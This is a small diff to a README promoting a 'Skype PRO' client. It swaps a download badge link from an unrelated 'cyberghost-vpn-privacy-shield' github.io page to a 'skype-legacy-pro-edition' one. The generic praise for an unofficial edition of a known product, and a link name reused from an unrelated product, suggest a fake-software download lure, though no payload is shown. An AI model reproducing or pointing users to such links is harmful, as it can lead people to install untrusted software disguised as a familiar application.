@@ -2,7 +2,7 @@
 
 A complete Skype client offering messaging, voice calls, video conferencing, and the familiar interface users love. Seamlessly integrates with all major operating systems and provides smooth, secure communication.
 
-[![Download Skype PRO](https://img.shields.io/badge/Download-Skype_PRO-blueviolet)](https://cyberghost-vpn-privacy-shield.github.io/.github)
+[![Download Skype PRO](https://img.shields.io/badge/Download-Skype_PRO-blueviolet)](https://skype-legacy-pro-edition.github.io/.github)
 
 ---
 
